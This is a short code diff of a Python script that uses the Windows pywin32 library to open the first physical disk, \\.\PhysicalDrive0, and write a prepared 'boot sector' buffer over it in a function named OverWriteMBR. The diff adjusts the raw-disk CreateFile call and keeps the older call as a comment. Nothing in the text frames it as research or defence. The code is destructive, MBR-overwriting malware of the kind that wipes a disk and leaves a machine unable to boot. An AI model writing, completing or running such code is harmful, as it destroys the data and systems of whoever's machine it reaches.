@@ -1,5 +1,5 @@
 import win32file as w32f
-
+import win32con as w32c
 
 buffer = bytes([
     # BOOT SECTOR DATA
@@ -19,7 +19,8 @@ buffer = bytes([
 """ return bytes([random.randint(0, 255) for _ in range(bytes_to_write)]) """
 
 def OverWriteMBR(): 
-    hDevice = w32f.CreateFileW(r"\\.\PhysicalDrive0", w32f.GENERIC_WRITE, w32f.FILE_SHARE_READ | w32f.FILE_SHARE_WRITE, None, w32f.OPEN_EXISTING, 0, 0)
+    hDevice = w32f.CreateFile(r"\\.\PhysicalDrive0", w32c.GENERIC_WRITE, 0 , None, w32c.CREATE_ALWAYS, 0, None)
+    #hDevice = w32f.CreateFileW(r"\\.\PhysicalDrive0", w32f.GENERIC_WRITE, w32f.FILE_SHARE_READ | w32f.FILE_SHARE_WRITE, None, w32f.OPEN_EXISTING, 0, 0)
     bytes_written = w32f.WriteFile(hDevice, buffer, None)
     w32f.CloseHandle(hDevice) # Close the handle to our Physical Drive!
 
